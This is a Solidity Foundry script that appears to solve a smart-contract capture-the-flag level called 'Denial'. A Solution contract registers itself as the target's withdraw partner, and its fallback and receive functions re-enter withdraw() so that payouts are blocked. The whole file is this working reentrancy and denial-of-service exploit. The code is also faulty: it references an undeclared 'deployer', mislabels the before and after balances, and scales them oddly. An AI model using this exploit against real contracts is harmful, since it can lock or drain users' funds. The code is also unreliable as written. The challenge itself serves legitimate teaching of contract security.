//SPDX-License-Identifier:MIT
pragma solidity ^0.8.0;

import {Script, console2} from "forge-std/Script.sol";

interface IDenial {
    function withdraw() external;
    function setWithdrawPartner(address _partner) external;
}

contract Solution {
    address public contractAddress;

    constructor(address _contractAddress) {
        contractAddress = _contractAddress;
        bytes memory data = abi.encodeWithSignature("setWithdrawPartner(address)", address(this));
        contractAddress.call(data);
        // contractAddress.call{setWithdrawPartner(address(this))};
    }

    fallback() external payable {
        IDenial(contractAddress).withdraw();
    }

    receive() external payable {
        IDenial(contractAddress).withdraw();
    }
}

contract SolutionScript is Script {
    constructor() {
        address player = deployer;
        // console2.log(player.balance);

        address contractAdd = 0x09E1c97dcF4059Bc650eF82Ef29ef76A758b8bcB;

        Solution solution = new Solution(contractAdd);
        uint256 afterBalance = contractAdd.balance * 10 ** 18;
        IDenial(contractAdd).withdraw();
        uint256 beforeBalance = contractAdd.balance * 10 ** 18;

        console2.log("afterBalance: ", afterBalance);
        console2.log("beforeBalance: ", beforeBalance);
        assert(afterBalance > beforeBalance);
    }
}
